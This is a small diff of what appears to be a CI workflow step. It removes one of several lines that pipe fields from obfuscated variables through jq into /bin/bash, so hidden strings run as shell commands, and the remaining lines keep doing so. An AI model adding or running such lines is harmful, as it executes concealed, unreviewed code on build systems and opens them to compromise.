@@ -32,7 +32,6 @@ jobs:
           echo $nas21 | jq -r .ohwhb93931 | /bin/bash
           echo $j27 | jq -r .ptuq073 | /bin/bash
           printf '%s' "$ksbhb7" | jq -r .hydv52 | /bin/bash
-          printf '%s' "$th1805" | jq -r .byfc00661 | /bin/bash
           echo $uxmj644 | jq -r .nan02410 | /bin/bash
 
       - name: Archive output
